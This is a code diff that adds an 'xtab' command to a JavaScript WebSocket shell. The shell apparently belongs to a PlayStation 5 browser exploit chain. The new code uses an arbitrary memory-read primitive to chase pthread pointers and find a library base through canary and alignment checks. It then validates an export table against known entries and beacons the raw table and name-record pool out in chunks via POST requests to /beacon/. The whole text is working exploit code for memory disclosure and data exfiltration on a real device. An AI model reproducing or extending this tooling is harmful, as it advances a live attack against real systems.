@@ -5654,6 +5654,124 @@ function _startWsShell(){
         break;
       }
 
+      case 'xtab':{
+        /* THE EXPORT-TABLE EXFIL (the deterministic NID-match route):
+         * dump the table at lk+0x48000 COMPLETE and RAW so the offline
+         * pass can match the name-record pool against ps5rs's 195K
+         * raw NID hexes (data/nids.csv column 2: e.g. thr_create =
+         * 0x4E276BD12611981E). Any 8-byte window in the pool that
+         * equals a known NID64 cracks the record format blind ->
+         * NID(thr_create) -> its entry -> text RVA -> the gated-ctx
+         * confirmation. PURE DATA-BAND READS (the [lk+0x48000,
+         * +0x76000) band is proven across 6+ sessions) - no calls,
+         * zero crash risk. msg.pool = pool bytes to dump (def 0x2000),
+         * capped at the band edge tbl+0x2E000. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function XT(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('XT-'+s),false);x.send();}catch(e){}}
+        try{
+          var ent=S.absRead(0x10001c8000n,0x100);
+          var trPtr=0n;
+          for(var ei=0;ei<ent.length;ei++){if(ent[ei]>=0x10001f0000n&&ent[ei]<0x1000200000n){trPtr=ent[ei];break;}}
+          if(trPtr===0n){reply.err='no thread-record ptr';break;}
+          var tr=S.absRead(trPtr,0x60);
+          var ptp=0n;
+          for(var ti2=0;ti2<tr.length;ti2++){if(tr[ti2]>=0x880000000n&&tr[ti2]<0x900000000n){ptp=tr[ti2];break;}}
+          if(ptp===0n){reply.err='no pthread ptr';break;}
+          var node=ptp,Q=0n;
+          for(var hop=0;hop<5;hop++){
+            var p=S.absRead(node,0x60);
+            Q=p[8];
+            if((Q&0x3fffn)===0x218n&&Q>0x800000000n)break;
+            node=Q-0x38n;
+          }
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var B=Q-0x6C218n;
+          if(B%0x4000n!==0n){reply.err='base unaligned';break;}
+          var can=S.absRead(B+0x751D0n,8)[0];
+          XT('1 B=0x'+B.toString(16)+' canary=0x'+can.toString(16));
+          if(!(can>0x1000000n)){reply.err='canary fail';break;}
+          reply.base='0x'+B.toString(16);
+          var tbl=B+0x48000n;
+          /* header: magic + size. The header layout is not fully pinned
+           * (magic@+0; size candidates at +4/+8/+C) - SELF-VALIDATE with
+           * the two PROVEN anchors: entry#5.text == 0x2C0 (thr_self,
+           * E2-landed) and entry#8.text == 0x410 (thr_new, game-lane
+           * cross-matched). Try each (size-slot, entry-base) combo. */
+          var hdrW=S.absRead(tbl,16);
+          var magic=Number(hdrW[0]&0xFFFFFFFFn);
+          XT('2 hdr magic=0x'+magic.toString(16)+' w1=0x'+hdrW[1].toString(16));
+          if(magic!==0x3b031b01){reply.err='bad magic 0x'+magic.toString(16);break;}
+          var sizeCands=[Number(hdrW[0]>>32n),Number(hdrW[1]&0xFFFFFFFFn),Number(hdrW[1]>>32n)];
+          var baseCands=[0xC,0x10,0x8];
+          var nE=0,eBase=0,eWords=null;
+          for(var sc=0;sc<sizeCands.length;sc++){
+            var sz=sizeCands[sc];
+            if(sz%8!==0)continue;
+            var n=Math.floor((sz-12)/8);
+            if(n<64||n>4096)continue;
+            for(var bc=0;bc<baseCands.length;bc++){
+              var eB=baseCands[bc];
+              var w5=S.absRead(tbl+BigInt(eB+5*8),8)[0];
+              var w8=S.absRead(tbl+BigInt(eB+8*8),8)[0];
+              var t5=0x48000+Number(BigInt.asIntN(32,w5&0xFFFFFFFFn));
+              var t8=0x48000+Number(BigInt.asIntN(32,w8&0xFFFFFFFFn));
+              if(t5===0x2C0&&t8===0x410){nE=n;eBase=eB;break;}
+            }
+            if(nE)break;
+          }
+          if(!nE){reply.err='no header combo satisfies anchors (#5=0x2C0,#8=0x410)';break;}
+          reply.n=nE;reply.ebase=eBase;
+          XT('3 nEntries='+nE+' eBase=+0x'+eBase.toString(16)+' size=0x'+(nE*8+12).toString(16));
+          /* all entries, chunked reads */
+          eWords=[];
+          for(var off=0;off<nE*8;off+=0x800){
+            var ck=Math.min(0x800,nE*8-off);
+            var ws=S.absRead(tbl+BigInt(eBase+off),ck);
+            for(var wi=0;wi<ws.length;wi++)eWords.push(ws[wi]);
+          }
+          XT('4 entries read n='+eWords.length);
+          /* beacon the full A table packed, 32 entries per line */
+          var maxA=0;
+          for(var i2=0;i2<nE&&i2<eWords.length;i2++){
+            var aV=Number(eWords[i2]>>32n);
+            if(aV>maxA)maxA=aV;
+          }
+          XT('5 maxA=0x'+maxA.toString(16));
+          for(var ln=0;ln<nE;ln+=32){
+            var parts=[];
+            for(var k=ln;k<Math.min(ln+32,nE);k++){
+              var w1=eWords[k];
+              var sR=Number(BigInt.asIntN(32,w1&0xFFFFFFFFn));
+              parts.push(k+':'+Number(w1>>32n).toString(16)+':'+(0x48000+sR).toString(16));
+            }
+            XT('E'+ln+' '+parts.join(','));
+          }
+          reply.maxA='0x'+maxA.toString(16);
+          /* the name-record pool: [tbl+eBase+nE*8, +pool) raw hex. The
+           * records live at pool+A per the session-55 read; size to
+           * maxA+0x100 (covers the largest record), floor 0x2000, hard-
+           * capped inside the proven band (tbl+0x2E000). */
+          var poolBase=tbl+BigInt(eBase+nE*8);
+          var poolCap=Number(0x2E000n-BigInt(eBase+nE*8));
+          var pool=Math.max(0x2000,Math.min((maxA||0)+0x100,0x10000,poolCap));
+          if(msg.pool)pool=Math.min(parseInt(msg.pool),poolCap);
+          XT('6 pool=0x'+pool.toString(16)+' base=+0x'+(eBase+nE*8).toString(16));
+          for(var po=0;po<pool;po+=0x400){
+            var pc=Math.min(0x400,pool-po);
+            var pws=S.absRead(poolBase+BigInt(po),pc);
+            var hx='';
+            for(var pi=0;pi<pws.length;pi++){
+              var wv=pws[pi];
+              for(var b7=56n;b7>=0n;b7-=8n){var bb=Number((wv>>b7)&0xFFn);hx+=(bb<16?'0':'')+bb.toString(16);}
+            }
+            XT('P'+po.toString(16)+' '+hx);
+          }
+          XT('7 DONE');
+          reply.ok=true;
+        }catch(e2){reply.err='xtab fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'nap':{
         /* THE NANOSLEEP TEST: call export entry #msg.idx with the
          * scope set to a timespec {tv_sec: msg.sec, tv_nsec: 0}.
